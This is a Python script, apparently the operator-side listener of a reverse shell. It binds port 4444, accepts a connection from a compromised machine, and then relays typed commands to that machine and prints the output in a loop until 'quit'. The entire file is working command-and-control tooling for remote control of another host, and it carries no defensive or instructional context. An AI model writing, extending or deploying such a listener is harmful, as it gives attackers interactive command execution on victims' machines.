import socket

class Listener:
    def __init__(self):
        lhost = (socket.gethostbyname_ex(socket.gethostname())[2][1])
        lport = 4444
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((lhost, lport))
        print("[*] Listening for Conections...")
        s.listen()
        conn, addr = s.accept()
        print(f"[+] Connected to {addr}")
        recieved_data = conn.recv(5000).decode()
        print(recieved_data)

        while True:
            command = input(">>> ")
            if command != "":
                if command != "quit":
                    conn.send(command.encode())
                    recieved_data = conn.recv(5000).decode()
                    print(recieved_data)
                else:
                    conn.close()
                    print("\n[-] Connection Closed!\n")
                    break
            else:
                pass